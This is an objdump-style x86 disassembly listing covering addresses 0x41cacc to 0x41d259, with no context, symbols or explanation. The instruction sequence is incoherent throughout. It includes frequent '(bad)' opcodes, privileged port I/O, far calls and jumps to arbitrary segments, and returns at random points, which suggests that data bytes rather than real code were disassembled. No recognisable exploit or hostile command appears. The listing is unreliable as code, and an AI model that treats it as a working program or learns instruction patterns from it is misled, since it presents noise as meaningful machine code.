  41cacc:	adc    DWORD PTR [ebx-0x2731922b],eax
  41cad2:	lea    edi,[esi-0x21a246ae]
  41cad8:	and    eax,0xfbe01193
  41cadd:	dec    edx
  41cade:	pop    es
  41cadf:	lea    ebp,[ebp-0x7f]
  41cae2:	xchg   cx,ax
  41cae4:	fadd   QWORD PTR [ecx+ecx*1-0x38ed6a13]
  41caeb:	dec    ebx
  41caec:	or     cl,BYTE PTR [esi-0x14]
  41caef:	inc    edx
  41caf0:	cmc    
  41caf1:	xor    al,0x5d
  41caf3:	loop   0x41cac3
  41caf5:	clc    
  41caf6:	push   edi
  41caf7:	cmp    eax,0x111fe937
  41cafc:	inc    ebx
  41cafd:	mov    ss,WORD PTR [eax]
  41caff:	loope  0x41caf8
  41cb01:	pushf  
  41cb02:	in     eax,0x4c
  41cb04:	xor    ah,BYTE PTR [esi]
  41cb06:	jl     0x41cad3
  41cb08:	and    al,0x17
  41cb0a:	cmp    al,0xc9
  41cb0c:	pop    esi
  41cb0d:	xor    al,BYTE PTR [ebx+ebx*1-0x62fb3178]
  41cb14:	cmp    ch,BYTE PTR [esi+esi*1]
  41cb17:	mov    al,cl
  41cb19:	aam    0xe4
  41cb1b:	sti    
  41cb1c:	pop    eax
  41cb1d:	inc    esp
  41cb1e:	mov    edx,0x47f027c
  41cb23:	pop    eax
  41cb24:	repnz or al,0xa6
  41cb27:	pusha  
  41cb28:	dec    eax
  41cb29:	mov    edx,0x7ff32dc
  41cb2e:	or     cl,BYTE PTR [ecx-0x1]
  41cb31:	ret    
  41cb32:	fst    st(0)
  41cb34:	fwait
  41cb35:	dec    edx
  41cb36:	std    
  41cb37:	vpsrlw xmm5,xmm6,XMMWORD PTR [ebx+0x2f]
  41cb3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb3d:	mov    edx,0x75d72695
  41cb42:	jle    0x41cb50
  41cb44:	shl    DWORD PTR [esi+ecx*4+0x2c],0x28
  41cb49:	and    eax,0x8f2202e3
  41cb4e:	ret    
  41cb4f:	in     eax,0x2b
  41cb51:	and    cl,dl
  41cb53:	in     al,dx
  41cb54:	pop    ss
  41cb55:	(bad)  
  41cb56:	inc    esi
  41cb57:	dec    ebx
  41cb58:	mov    bh,0x3
  41cb5a:	retf   
  41cb5b:	int    0xeb
  41cb5d:	outs   dx,DWORD PTR ds:[esi]
  41cb5e:	daa    
  41cb5f:	xor    dh,BYTE PTR [edx-0x1c2ca3d4]
  41cb65:	or     DWORD PTR [eax+0x54209721],esi
  41cb6b:	add    bl,BYTE PTR [edi]
  41cb6d:	les    ebx,FWORD PTR [ecx]
  41cb6f:	add    BYTE PTR [ebp-0x7e],bl
  41cb72:	es dec ebp
  41cb74:	add    al,0x62
  41cb76:	pop    edi
  41cb77:	pop    ecx
  41cb78:	dec    ebp
  41cb79:	ret    
  41cb7a:	or     DWORD PTR [eax-0x4b],eax
  41cb7d:	aam    0x50
  41cb7f:	push   ds
  41cb80:	mov    al,ds:0x58132cc0
  41cb85:	add    eax,0xa987c6d
  41cb8a:	pop    edx
  41cb8b:	cmp    al,al
  41cb8d:	jb     0x41cbdf
  41cb8f:	call   0x8e32:0x42536359
  41cb96:	pop    es
  41cb97:	xchg   ebp,eax
  41cb98:	push   eax
  41cb99:	push   edi
  41cb9a:	scas   al,BYTE PTR es:[edi]
  41cb9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb9c:	add    BYTE PTR [edi],cl
  41cb9e:	ret    0xddc
  41cba1:	xlat   BYTE PTR ds:[ebx]
  41cba2:	jmp    FWORD PTR [esp+eax*4]
  41cba5:	xor    ch,bl
  41cba7:	add    eax,0xc973f31c
  41cbac:	pop    ss
  41cbad:	ins    BYTE PTR es:[edi],dx
  41cbae:	rol    ebp,0x85
  41cbb1:	mov    ds:0xc1ed62ae,al
  41cbb6:	call   0x2002:0x2d2dba9e
  41cbbd:	lea    esp,ds:0x79952f5
  41cbc3:	retf   0x5137
  41cbc6:	out    0x71,eax
  41cbc8:	fisubr WORD PTR [ecx+ecx*8-0x7e]
  41cbcc:	mov    ah,0x1c
  41cbce:	xchg   ecx,eax
  41cbcf:	sbb    BYTE PTR [edi+0x57c4659c],ch
  41cbd5:	imul   BYTE PTR [ebx-0x2e]
  41cbd8:	xor    edx,0xffffff96
  41cbdb:	ins    DWORD PTR es:[edi],dx
  41cbdc:	mov    ebx,0x98ea4f18
  41cbe1:	mov    bh,BYTE PTR [ebx+eiz*1+0x50209f1c]
  41cbe8:	mov    WORD PTR [esi-0x75],?
  41cbeb:	loope  0x41cb9e
  41cbed:	mov    edx,DWORD PTR es:[esi+0x644c72f6]
  41cbf4:	pusha  
  41cbf5:	and    bl,bl
  41cbf7:	lock int 0xa6
  41cbfa:	lahf   
  41cbfb:	mov    ds:0x6e9e0db9,eax
  41cc00:	mov    ecx,0x74d85a08
  41cc05:	daa    
  41cc06:	adc    edx,DWORD PTR [ecx+edx*8+0xb137790]
  41cc0d:	mov    esp,0xdfd907fb
  41cc12:	int    0x7b
  41cc14:	aas    
  41cc15:	icebp  
  41cc16:	mov    BYTE PTR [ecx-0x64220814],ch
  41cc1c:	adc    eax,DWORD PTR [ecx-0x3ae5aa92]
  41cc22:	repz dec DWORD PTR [eax+0x61f194e8]
  41cc29:	mov    gs,esp
  41cc2b:	sub    BYTE PTR [edi+0x4],bh
  41cc2e:	mov    WORD PTR [ecx],?
  41cc30:	adc    esp,ebp
  41cc32:	pop    es
  41cc33:	sbb    cl,BYTE PTR [edi]
  41cc35:	pop    ecx
  41cc36:	imul   esp,DWORD PTR [edx+0x6a],0xffffff9c
  41cc3a:	dec    edx
  41cc3b:	mov    ebp,0xc42faa9c
  41cc40:	push   ss
  41cc41:	out    0x10,al
  41cc43:	fs retf 
  41cc45:	dec    ecx
  41cc46:	ss aas 
  41cc48:	stos   DWORD PTR es:[edi],eax
  41cc49:	(bad)  
  41cc4a:	mov    dl,0x6e
  41cc4c:	nop
  41cc4d:	pop    ecx
  41cc4e:	xor    al,0x5e
  41cc50:	cmp    edx,DWORD PTR ds:0x399fb595
  41cc56:	mov    dh,0x5a
  41cc58:	sub    edx,DWORD PTR [edi-0x35]
  41cc5b:	rol    BYTE PTR [ecx],0x8f
  41cc5e:	fwait
  41cc5f:	das    
  41cc60:	inc    ecx
  41cc61:	shl    BYTE PTR [esp+edi*1-0xa],0xe5
  41cc66:	pop    esp
  41cc67:	mov    cl,0x5e
  41cc69:	nop
  41cc6a:	out    0xce,eax
  41cc6c:	inc    esp
  41cc6d:	in     al,0x59
  41cc6f:	xchg   ebx,eax
  41cc70:	push   ebx
  41cc71:	and    eax,DWORD PTR [ecx+0x3658b2cc]
  41cc77:	ss and al,0xb4
  41cc7a:	or     DWORD PTR [esi-0x24],ecx
  41cc7d:	outs   dx,DWORD PTR ds:[esi]
  41cc7e:	mov    dh,0xb7
  41cc80:	sub    eax,0x40302fd
  41cc85:	sbb    eax,0x8a67ae4
  41cc8a:	clc    
  41cc8b:	lock out 0x45,al
  41cc8e:	mov    eax,ds:0x9566f89f
  41cc93:	mov    edi,0xcae039b9
  41cc98:	mov    ebp,0x8a8dd522
  41cc9d:	xlat   BYTE PTR ss:[ebx]
  41cc9f:	xchg   ecx,eax
  41cca0:	ins    DWORD PTR es:[edi],dx
  41cca1:	adc    edx,ecx
  41cca3:	int    0x91
  41cca5:	mov    eax,0xbd4ad60
  41ccaa:	and    al,al
  41ccac:	inc    edx
  41ccad:	retf   0xb6c4
  41ccb0:	cld    
  41ccb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccb2:	jmp    0x583a3b21
  41ccb7:	rcr    DWORD PTR [esp+ecx*1+0x39124741],1
  41ccbe:	dec    ebx
  41ccbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccc0:	and    esi,DWORD PTR [eax]
  41ccc2:	pusha  
  41ccc3:	mov    ebp,0x101dee0d
  41ccc8:	ja     0x41cd3c
  41ccca:	in     al,0xf9
  41cccc:	mov    cl,0x57
  41ccce:	pop    ds
  41cccf:	aam    0x48
  41ccd1:	cmc    
  41ccd2:	cli    
  41ccd3:	push   0x4e
  41ccd5:	inc    esi
  41ccd6:	fsubr  QWORD PTR [ebx-0x754656f4]
  41ccdc:	call   0xb30:0x2959527a
  41cce3:	popf   
  41cce4:	sti    
  41cce5:	and    BYTE PTR [ecx+eax*4+0x4c],dh
  41cce9:	xchg   DWORD PTR [edx-0x9],esp
  41ccec:	jnp    0x41cd63
  41ccee:	imul   eax,DWORD PTR [eax-0x39],0x16bb2eb0
  41ccf5:	xor    esp,DWORD PTR [ebp+0x6490787e]
  41ccfb:	mov    ds:0x8ccd4d12,eax
  41cd00:	pop    DWORD PTR [eax]
  41cd02:	jno    0x41ccef
  41cd04:	add    BYTE PTR [eax],ch
  41cd06:	loope  0x41cd62
  41cd08:	push   edx
  41cd09:	stos   BYTE PTR es:[edi],al
  41cd0a:	add    DWORD PTR ds:0xbbd6e299,eax
  41cd10:	adc    ah,ah
  41cd12:	adc    ebp,ebp
  41cd14:	ror    BYTE PTR [ebx+0x70de15c3],cl
  41cd1a:	rol    DWORD PTR [esi-0x965681],cl
  41cd20:	jbe    0x41ccd5
  41cd22:	xor    ebp,eax
  41cd24:	and    eax,0x8af3acc
  41cd29:	pop    ecx
  41cd2a:	iret   
  41cd2b:	pop    ebp
  41cd2c:	dec    esp
  41cd2d:	mov    DWORD PTR [ebx+0x10],ebp
  41cd30:	ss (bad) 
  41cd32:	mov    esp,0x7a49a709
  41cd37:	xor    DWORD PTR [eax+0x40902d6f],esp
  41cd3d:	test   al,0x73
  41cd3f:	sti    
  41cd40:	xor    esi,esi
  41cd42:	arpl   di,cx
  41cd44:	mov    ebx,DWORD PTR [edx+0x2562df70]
  41cd4a:	cmp    al,0x34
  41cd4c:	xor    eax,0xe12d4f6e
  41cd51:	sti    
  41cd52:	adc    BYTE PTR [bx+si+0x41cb],bh
  41cd57:	xor    al,0x65
  41cd59:	cmp    al,dl
  41cd5b:	jmp    0x41cda2
  41cd5d:	inc    ebp
  41cd5e:	push   0xfffffffc
  41cd60:	adc    DWORD PTR [edi-0x6],esi
  41cd63:	mov    eax,DWORD PTR [edx-0x46]
  41cd66:	xchg   al,ch
  41cd68:	sbb    DWORD PTR [ecx-0x2a],edx
  41cd6b:	xchg   edi,eax
  41cd6c:	sub    BYTE PTR [edi-0x7cf831fe],0xba
  41cd73:	aad    0xc4
  41cd75:	or     DWORD PTR [esp+ebp*8+0x3],0xffffffff
  41cd7a:	or     BYTE PTR [esi-0x3e],0x6
  41cd7e:	jmp    0x78f93879
  41cd83:	jo     0x41cd1c
  41cd85:	(bad)  
  41cd86:	jecxz  0x41cd96
  41cd88:	push   0x38
  41cd8a:	(bad)  
  41cd8b:	xor    cl,BYTE PTR [ecx+0x79]
  41cd8e:	push   esi
  41cd8f:	pop    edi
  41cd90:	push   0xffffffdf
  41cd92:	add    al,0x53
  41cd94:	dec    edx
  41cd95:	adc    DWORD PTR [ecx-0x14],esi
  41cd98:	mov    ch,0xfe
  41cd9a:	aam    0x47
  41cd9c:	or     al,BYTE PTR [edi+0x10]
  41cd9f:	sbb    eax,0xbed64cfe
  41cda4:	fcomp  DWORD PTR [edi+0x79a4e386]
  41cdaa:	jbe    0x41cde4
  41cdac:	addr16 (bad) 
  41cdae:	sbb    eax,0xcc841537
  41cdb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdb4:	imul   ebp,DWORD PTR [ebx-0x5d873ba5],0x5d
  41cdbb:	add    BYTE PTR [ecx-0x52ce3b34],0x40
  41cdc2:	sub    DWORD PTR [esi+0x57e52063],esp
  41cdc8:	dec    ebx
  41cdc9:	mov    cl,0xc1
  41cdcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdcc:	test   eax,0x4f858831
  41cdd1:	or     al,0x68
  41cdd3:	cmp    BYTE PTR [eax-0x44],0x15
  41cdd7:	(bad)  
  41cdd8:	cdq    
  41cdd9:	add    esi,ecx
  41cddb:	mov    dh,0x2
  41cddd:	sub    BYTE PTR [edx-0x46],ah
  41cde0:	adc    esi,DWORD PTR [edx+0x67]
  41cde3:	add    eax,0xbcd003aa
  41cde8:	mov    BYTE PTR [edx+0x7c],dl
  41cdeb:	outs   dx,BYTE PTR ds:[esi]
  41cdec:	call   0x63b33d7e
  41cdf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdf2:	loop   0x41ce0e
  41cdf4:	repnz dec ebx
  41cdf6:	das    
  41cdf7:	inc    edx
  41cdf8:	cs popa 
  41cdfa:	xor    edx,DWORD PTR [ecx]
  41cdfc:	cmp    ah,ah
  41cdfe:	fwait
  41cdff:	jbe    0x41ce24
  41ce01:	jmp    0x233c965f
  41ce06:	add    eax,0xcdeee794
  41ce0b:	jmp    0x41ce28
  41ce0d:	jns    0x41cdf9
  41ce0f:	add    BYTE PTR [ebx],bl
  41ce11:	mov    edi,DWORD PTR cs:[ebp+0x7570e6a9]
  41ce18:	in     al,0x63
  41ce1a:	aas    
  41ce1b:	fld    QWORD PTR ds:0x78fc4723
  41ce21:	cmp    DWORD PTR [ebx-0x5e],eax
  41ce24:	cld    
  41ce25:	xor    eax,0xa90c2296
  41ce2a:	dec    ebp
  41ce2b:	inc    ebx
  41ce2c:	cmp    eax,0x22f93e5d
  41ce31:	sub    edx,edx
  41ce33:	sub    ebx,DWORD PTR [ebx-0x48]
  41ce36:	lds    ebx,FWORD PTR [edi-0x4c]
  41ce39:	sbb    ebp,DWORD PTR [eax-0x4f08a351]
  41ce3f:	adc    eax,0xc662e683
  41ce44:	sbb    DWORD PTR [edx+0x4f],edx
  41ce47:	fs push ebx
  41ce49:	inc    eax
  41ce4a:	xchg   edi,eax
  41ce4b:	stos   DWORD PTR es:[edi],eax
  41ce4c:	add    al,0x1e
  41ce4e:	cdq    
  41ce4f:	xor    al,0x6e
  41ce51:	dec    esi
  41ce52:	sub    dl,dh
  41ce54:	clc    
  41ce55:	add    cl,BYTE PTR [edx+0x34bb1e9f]
  41ce5b:	cli    
  41ce5c:	xor    eax,edi
  41ce5e:	add    ebp,DWORD PTR gs:[ecx-0x77ab908e]
  41ce65:	or     ch,BYTE PTR [ecx]
  41ce67:	or     DWORD PTR [edi+0x7a],0xbc1b86bb
  41ce6e:	les    esp,FWORD PTR [ebx-0x50f95834]
  41ce74:	(bad)  
  41ce75:	aam    0xfe
  41ce77:	popf   
  41ce78:	test   DWORD PTR [esi*1+0x69080b2e],edx
  41ce7f:	mov    BYTE PTR [ebx-0x5e],ah
  41ce82:	fxch   st(3)
  41ce84:	cmp    DWORD PTR [edx-0x7f],ebp
  41ce87:	pop    eax
  41ce88:	cmp    eax,0x4a11ef77
  41ce8d:	lock fs cmp dh,bh
  41ce91:	mov    edx,0xda3363db
  41ce96:	imul   edx,DWORD PTR [edx+0x30],0x4a0a453d
  41ce9d:	xchg   edx,eax
  41ce9e:	push   cs
  41ce9f:	shl    DWORD PTR [eax],cl
  41cea1:	mov    eax,0x45be9b11
  41cea6:	sbb    dh,BYTE PTR [esi-0x2d9965fd]
  41ceac:	xchg   edi,eax
  41cead:	stc    
  41ceae:	mov    esi,0x194bcddc
  41ceb3:	sahf   
  41ceb4:	cmp    eax,0x3fac27a7
  41ceb9:	and    DWORD PTR [edi],eax
  41cebb:	mov    ah,0x8e
  41cebd:	ret    0xfed6
  41cec0:	sub    al,0x56
  41cec2:	pop    esi
  41cec3:	xor    cl,0xaf
  41cec6:	push   edx
  41cec7:	cmp    BYTE PTR [edx],ah
  41cec9:	dec    edx
  41ceca:	leave  
  41cecb:	sbb    ebx,0xd82ab2a4
  41ced1:	mov    ch,0xe3
  41ced3:	fnstenv [edi+0x68f534b7]
  41ced9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ceda:	cmp    eax,0xc36a16c2
  41cedf:	push   ebx
  41cee0:	lahf   
  41cee1:	retf   0x5d2c
  41cee4:	retf   0x63c3
  41cee7:	xchg   edi,eax
  41cee8:	repnz push DWORD PTR [eax+0x3c]
  41ceec:	xchg   ecx,eax
  41ceed:	dec    edi
  41ceee:	pop    es
  41ceef:	fstp   st(0)
  41cef1:	test   DWORD PTR [esi+edx*8+0x50],eax
  41cef5:	fisub  DWORD PTR [eax-0x5]
  41cef8:	out    dx,eax
  41cef9:	sub    DWORD PTR ds:0x926115d5,edx
  41ceff:	pushf  
  41cf00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf01:	jno    0x41cf68
  41cf03:	mov    al,BYTE PTR [ebx+0x503b413e]
  41cf09:	or     DWORD PTR [ebp+0x590aaa89],ebp
  41cf0f:	inc    ebx
  41cf10:	in     eax,dx
  41cf11:	adc    ecx,ebx
  41cf13:	add    DWORD PTR [edi-0x3ba309fb],ebp
  41cf19:	pop    es
  41cf1a:	and    eax,0xc1435d80
  41cf1f:	adc    eax,0xf7eabab2
  41cf24:	imul   ecx,DWORD PTR [edi+0x6de7072f],0x28
  41cf2b:	add    BYTE PTR [edi+ebp*8],0x6f
  41cf2f:	dec    ebp
  41cf30:	lahf   
  41cf31:	fs call 0x31c01e64
  41cf37:	jne    0x41cf42
  41cf39:	popa   
  41cf3a:	jmp    0x41cee4
  41cf3c:	mov    cl,0xc8
  41cf3e:	dec    edx
  41cf3f:	sbb    al,0xdc
  41cf41:	mov    al,0x71
  41cf43:	push   cs
  41cf44:	int    0x21
  41cf46:	push   esi
  41cf47:	pop    edx
  41cf48:	xor    DWORD PTR [edx+0x28],ebp
  41cf4b:	inc    eax
  41cf4c:	mov    DWORD PTR [edi],esi
  41cf4e:	std    
  41cf4f:	stc    
  41cf50:	fcomp  QWORD PTR [ebx-0x6a]
  41cf53:	je     0x41cf75
  41cf55:	jle    0x41cf13
  41cf57:	in     eax,dx
  41cf58:	inc    esi
  41cf59:	mov    WORD PTR [edx],gs
  41cf5b:	or     cl,BYTE PTR [esi]
  41cf5d:	push   ebx
  41cf5e:	ret    0xad05
  41cf61:	jge    0x41cfbf
  41cf63:	jns    0x41cf8b
  41cf65:	mov    ah,0x24
  41cf67:	sbb    BYTE PTR [esi],bh
  41cf69:	repz push ebx
  41cf6b:	and    DWORD PTR [eax+0x6c],ebx
  41cf6e:	mov    ebp,0x761e252a
  41cf73:	fwait
  41cf74:	xor    dl,cl
  41cf76:	sub    esi,DWORD PTR [edx+0x45db1631]
  41cf7c:	fisub  DWORD PTR ds:0xa7aaff0b
  41cf82:	out    dx,eax
  41cf83:	stos   BYTE PTR es:[edi],al
  41cf84:	ja     0x41cf4c
  41cf86:	add    al,ch
  41cf88:	cwde   
  41cf89:	rcl    BYTE PTR [ecx+0x8],1
  41cf8c:	xchg   DWORD PTR [esi],ebp
  41cf8e:	fdivp  st(7),st
  41cf90:	aaa    
  41cf91:	aaa    
  41cf92:	cmp    BYTE PTR [ebx],dl
  41cf94:	mov    ch,0xa8
  41cf96:	pop    esp
  41cf97:	gs icebp 
  41cf99:	sbb    BYTE PTR [eax+0x13],ch
  41cf9c:	xchg   ebx,eax
  41cf9d:	mov    edx,0xb1284086
  41cfa2:	sbb    eax,DWORD PTR [ebx+eax*4+0x15e1728b]
  41cfa9:	dec    eax
  41cfaa:	mov    cl,0x84
  41cfac:	jl     0x41d008
  41cfae:	dec    esp
  41cfaf:	inc    ebx
  41cfb0:	retf   
  41cfb1:	(bad)  
  41cfb2:	out    0x85,eax
  41cfb4:	popf   
  41cfb5:	and    eax,0xdb4722c0
  41cfba:	test   al,0xb9
  41cfbc:	nop
  41cfbd:	pop    edi
  41cfbe:	retf   
  41cfbf:	scas   eax,DWORD PTR es:[edi]
  41cfc0:	cmp    DWORD PTR [edx],ecx
  41cfc2:	mov    ds:0xcba9697a,eax
  41cfc7:	ffree  st(0)
  41cfc9:	sbb    BYTE PTR [edx-0xe],dl
  41cfcc:	imul   edx,ebx,0x46
  41cfcf:	adc    DWORD PTR [esi-0x59],ebx
  41cfd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfd3:	mov    ecx,0x67adad65
  41cfd8:	adc    dh,bl
  41cfda:	push   ecx
  41cfdb:	int3   
  41cfdc:	std    
  41cfdd:	xchg   edx,eax
  41cfde:	push   ds
  41cfdf:	nop
  41cfe0:	or     al,0xbf
  41cfe2:	jl     0x41d040
  41cfe4:	mov    ch,0x89
  41cfe6:	push   ds
  41cfe7:	adc    dl,bh
  41cfe9:	fs daa 
  41cfeb:	lock xchg esp,eax
  41cfed:	cmp    eax,0x8adfdc74
  41cff2:	cmp    DWORD PTR [eax],edi
  41cff4:	pushf  
  41cff5:	adc    BYTE PTR [esi],bl
  41cff7:	xor    bl,dh
  41cff9:	adc    al,0xa5
  41cffb:	call   0x9a2c:0x30cdd29b
  41d002:	(bad)  
  41d003:	loopne 0x41cf87
  41d005:	add    al,0x91
  41d007:	and    eax,0x96eb7edc
  41d00c:	jg     0x41d069
  41d00e:	sbb    eax,0x43857ec1
  41d013:	xchg   edx,eax
  41d014:	jne    0x41d067
  41d016:	sbb    BYTE PTR [ecx-0x49],ah
  41d019:	call   0x6b05:0x89ab3d30
  41d020:	push   ebp
  41d021:	adc    DWORD PTR [ebx+esi*2+0x137d61a8],esp
  41d028:	xchg   esi,eax
  41d029:	imul   edx,DWORD PTR [eax],0x31
  41d02c:	test   DWORD PTR [ebx-0x67],esp
  41d02f:	sahf   
  41d030:	cmp    edi,DWORD PTR [esi+0x47ec0e34]
  41d036:	mov    bh,0x36
  41d038:	repnz ins BYTE PTR es:[edi],dx
  41d03a:	(bad)  
  41d03b:	dec    esp
  41d03c:	jo     0x41d073
  41d03e:	xor    BYTE PTR [ebx],al
  41d040:	xor    ah,BYTE PTR [eax]
  41d042:	pop    eax
  41d043:	mov    esp,0xf0ce419a
  41d048:	mov    bh,0x61
  41d04a:	xchg   DWORD PTR [ebx-0xb],edx
  41d04d:	sub    al,0x54
  41d04f:	icebp  
  41d050:	cmp    dh,BYTE PTR [eax]
  41d052:	test   DWORD PTR [eax-0x1052a3cb],edx
  41d058:	lea    esp,[ebp-0x2173fbd0]
  41d05e:	fwait
  41d05f:	cli    
  41d060:	jmp    0x41d012
  41d062:	adc    eax,0x1003abb2
  41d067:	fs or  esi,edx
  41d06a:	cs mov edx,0x333b7892
  41d070:	in     al,dx
  41d071:	or     al,0xe4
  41d073:	sti    
  41d074:	adc    BYTE PTR [esi-0x347d6a48],ah
  41d07a:	test   esi,ecx
  41d07c:	scas   al,BYTE PTR es:[edi]
  41d07d:	mov    edx,0xcfb744ad
  41d082:	push   cs
  41d083:	aas    
  41d084:	push   DWORD PTR [eax-0x4ca4dbcf]
  41d08a:	add    BYTE PTR [edx-0x4d9f83e0],0xd9
  41d091:	xchg   ebx,eax
  41d092:	xor    dh,BYTE PTR [edi-0x7]
  41d095:	cs das 
  41d097:	jp     0x41d0c4
  41d099:	gs dec esp
  41d09b:	push   ebx
  41d09c:	mov    ds:0x1d7e100f,eax
  41d0a1:	adc    cl,BYTE PTR [edi]
  41d0a3:	fild   WORD PTR [eax]
  41d0a5:	int3   
  41d0a6:	xor    BYTE PTR [ebx],al
  41d0a8:	mov    ds:0x89c3a5da,eax
  41d0ad:	mov    bh,BYTE PTR [ebp-0x48af80ad]
  41d0b3:	mov    DWORD PTR [edx],ebp
  41d0b5:	sti    
  41d0b6:	jno    0x41d102
  41d0b8:	cmp    eax,0xa99956bf
  41d0bd:	sahf   
  41d0be:	cli    
  41d0bf:	mov    BYTE PTR [esi+0x54],dh
  41d0c2:	mov    dl,0xda
  41d0c4:	jmp    0xe0bf75dc
  41d0c9:	das    
  41d0ca:	or     eax,0xf5f90457
  41d0cf:	mov    edi,0x2dcc2f4c
  41d0d4:	jp     0x41d070
  41d0d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0d7:	jge    0x77185052
  41d0dd:	in     al,0x4e
  41d0df:	dec    ecx
  41d0e0:	adc    DWORD PTR [ebx+ebp*4],edi
  41d0e3:	ss into 
  41d0e5:	mov    ch,0x86
  41d0e7:	sbb    al,0x21
  41d0e9:	mov    esp,0x47ca708d
  41d0ee:	fsub   DWORD PTR [ecx+0x48adca66]
  41d0f4:	mov    eax,0x9a081ff5
  41d0f9:	push   eax
  41d0fa:	pop    es
  41d0fb:	fist   WORD PTR [eax+0xa]
  41d0fe:	mov    dl,0x30
  41d100:	enter  0x880c,0xf
  41d104:	aaa    
  41d105:	jg     0x41d095
  41d107:	mov    esi,0x4a11bb78
  41d10c:	shr    DWORD PTR ds:0x5e3d66f6,cl
  41d112:	inc    edi
  41d113:	mov    dl,0xbe
  41d115:	scas   eax,DWORD PTR es:[edi]
  41d116:	inc    edi
  41d117:	xchg   ebx,eax
  41d118:	mov    bl,0x98
  41d11a:	mov    ch,0x11
  41d11c:	adc    BYTE PTR ds:0xcc348408,cl
  41d122:	and    eax,0xe7af82fc
  41d127:	cmp    eax,0x7b50a88f
  41d12c:	fld    QWORD PTR [eax]
  41d12e:	les    eax,FWORD PTR [esi]
  41d130:	outs   dx,BYTE PTR ds:[esi]
  41d131:	jo     0x41d13a
  41d133:	into   
  41d134:	into   
  41d135:	retf   0x6a6
  41d138:	psubd  mm6,QWORD PTR [ecx-0x4ca428e]
  41d13f:	mov    ds:0x22783769,eax
  41d144:	jmp    0x4b48:0x9796c5cb
  41d14b:	es push esp
  41d14d:	sbb    eax,0xbfe4b0e0
  41d152:	xor    bh,BYTE PTR [edx+0x36013c1f]
  41d158:	popf   
  41d159:	sub    DWORD PTR [ebp-0x64],0x1f
  41d15d:	in     al,dx
  41d15e:	ins    BYTE PTR es:[edi],dx
  41d15f:	add    BYTE PTR [edi-0x17a0e995],dh
  41d165:	jne    0x41d1b2
  41d167:	xlat   BYTE PTR ds:[ebx]
  41d168:	fidivr DWORD PTR [ecx]
  41d16a:	iret   
  41d16b:	mov    ds:0x6a68ec34,al
  41d170:	mov    bl,0xe1
  41d172:	push   0xffffff86
  41d174:	mov    WORD PTR [eax-0x4b],ss
  41d177:	call   0x39e1:0x632de140
  41d17e:	inc    ebp
  41d17f:	sahf   
  41d180:	xchg   ebp,eax
  41d181:	pmulhuw mm5,mm6
  41d184:	add    ebp,DWORD PTR [eax]
  41d186:	repz test ah,al
  41d189:	jg     0x41d1e0
  41d18b:	ss xchg ebx,eax
  41d18d:	or     eax,0x528f2aff
  41d192:	into   
  41d193:	xor    BYTE PTR [edx],bh
  41d195:	retf   0x2889
  41d198:	ss call 0x3a88617b
  41d19e:	dec    edi
  41d19f:	or     cl,BYTE PTR [ebx-0x53aba339]
  41d1a5:	in     eax,0x31
  41d1a7:	fmul   DWORD PTR [eax-0x78515877]
  41d1ad:	xchg   ebx,eax
  41d1ae:	pop    ecx
  41d1af:	in     eax,dx
  41d1b0:	dec    eax
  41d1b1:	adc    DWORD PTR [ebx+0x64],edx
  41d1b4:	(bad)  
  41d1b5:	adc    al,0x72
  41d1b7:	scas   eax,DWORD PTR es:[edi]
  41d1b8:	adc    DWORD PTR [eax],ecx
  41d1ba:	sti    
  41d1bb:	xor    al,0xe9
  41d1bd:	cwde   
  41d1be:	daa    
  41d1bf:	jbe    0x41d23f
  41d1c1:	jp     0x41d1f5
  41d1c3:	inc    ebp
  41d1c4:	test   eax,0xeefcabf4
  41d1c9:	jp     0x41d1b4
  41d1cb:	test   BYTE PTR [eax+0x4c],al
  41d1ce:	rol    BYTE PTR [eax],cl
  41d1d0:	leave  
  41d1d1:	sbb    DWORD PTR [esi-0x76],ecx
  41d1d4:	xchg   ebx,eax
  41d1d5:	in     al,dx
  41d1d6:	mov    eax,0x1771d61b
  41d1db:	jnp    0x41d1a0
  41d1dd:	mov    ds,WORD PTR [ecx+ebp*4-0x3e6cfd1d]
  41d1e4:	js     0x41d23b
  41d1e6:	push   esp
  41d1e7:	mov    ebx,0x2edd4de0
  41d1ec:	pop    eax
  41d1ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1ef:	scas   al,BYTE PTR es:[edi]
  41d1f0:	into   
  41d1f1:	and    BYTE PTR [ecx-0x5d5d02c4],al
  41d1f7:	mov    ecx,0xa8ba656
  41d1fc:	cld    
  41d1fd:	inc    eax
  41d1fe:	mov    bh,0x71
  41d200:	(bad)  
  41d201:	das    
  41d202:	or     al,0x47
  41d204:	lea    edx,[ebp+0xe]
  41d207:	cli    
  41d208:	(bad)  
  41d209:	cmp    BYTE PTR [eax-0x10],bh
  41d20c:	stos   DWORD PTR es:[edi],eax
  41d20d:	pusha  
  41d20e:	xlat   BYTE PTR ds:[ebx]
  41d20f:	mov    ebp,0x8080726d
  41d214:	out    0x6f,eax
  41d216:	out    dx,eax
  41d217:	rcr    BYTE PTR ds:0x908f6053,1
  41d21d:	mov    al,0x9f
  41d21f:	js     0x41d1ba
  41d221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d222:	mov    ds:0xb53ff1a4,eax
  41d227:	lea    esp,cs:[edi+eiz*4+0x1b]
  41d22c:	push   0xffffffa4
  41d22e:	ret    
  41d22f:	and    edi,DWORD PTR [edx+ebx*1+0x4106f701]
  41d236:	mov    bl,BYTE PTR [edx-0x4fa09a74]
  41d23c:	imul   edx,ebx,0xea54d704
  41d242:	lock outs dx,BYTE PTR ds:[esi]
  41d244:	leave  
  41d245:	dec    ebp
  41d246:	inc    eax
  41d247:	call   FWORD PTR [ebp-0x3f238a76]
  41d24d:	dec    ecx
  41d24e:	popa   
  41d24f:	and    eax,0xb1f526f
  41d254:	outs   dx,BYTE PTR ds:[esi]
  41d255:	push   ds
  41d256:	adc    al,0xb1
  41d258:	leave  
  41d259:	pop    ebx
